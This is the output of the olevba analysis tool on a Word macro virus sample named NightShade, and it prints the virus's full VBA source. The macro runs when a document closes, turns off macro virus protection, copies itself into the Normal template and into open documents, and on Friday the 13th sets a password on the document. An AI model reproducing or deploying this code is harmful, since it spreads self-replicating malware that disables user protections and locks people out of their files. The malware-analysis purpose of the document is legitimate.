olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade.e-7ce981fd5a1a33eae861814087c946931df28cbc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade.e-7ce981fd5a1a33eae861814087c946931df28cbc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SPY.bas 
in file: Virus.MSWord.NightShade.e-7ce981fd5a1a33eae861814087c946931df28cbc - OLE stream: 'Macros/VBA/SPY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Screen Protection Program\r\n"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.SPY.AutoClose"
On Error GoTo SPY
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False
  
  Set ADoc = ActiveDocument
  Set GDoc = NormalTemplate
  
  Dinstalled = False
  Ginstalled = False
  
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "SPY" Then
      Dinstalled = True
      End If
  Next
  
  For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "SPY" Then
      Ginstalled = True
      End If
  Next
  
  If Dinstalled = False Then
  Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SPY", Object:=wdOrganizerObjectProjectItems
  ActiveDoc.SaveAs FileName:=ADoc.Name, FileFormat:=wdFormatTemplate
  End If
  
  If Ginstalled = False Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SPY", Object:=wdOrganizerObjectProjectItems
  Options.SaveNormalPrompt = False
  End If
  
  Randomize
  If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
If WeekDay(Now()) = 1 Or WeekDay(Now()) = 7 Then
  Assistant.Visible = True
  With Assistant.NewBalloon
  .Icon = msoIconAlert
  .Text = "µ¹§Ú©ñ°²,¨ä¾l§K½Í!"
  .Heading = "ÄY­«Äµ§i:"
  .Show
  End With
  
Else
   Set balloon1 = Assistant.NewBalloon
   balloon1.Heading = "¶Ù!²Ö¤F¶Ü?"
   Set balloon2 = Assistant.NewBalloon
   balloon2.Heading = "¨ÓªM¯ù,»´ÃP¤@¤U!"
      balloon1.Show
      balloon2.Show
  Assistant.Visible = False
  With Assistant.NewBalloon
  .Icon = msoIconTip
  .Text = "¸ê°T¦w¥þ,¤H¤H¦³³d"
  .Heading = "¨C¤éÄµ»y:"
  .Show
  End With
  
 End If
End If

If WeekDay(Now()) = 6 And Day(Now()) = 13 Then
  If ActiveDocument.HasPassword = False Then
     ActiveDocument.Password = "SPY"
   End If
End If

Application.DisplayAlerts = wdAlertsAll

SPY:
      

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

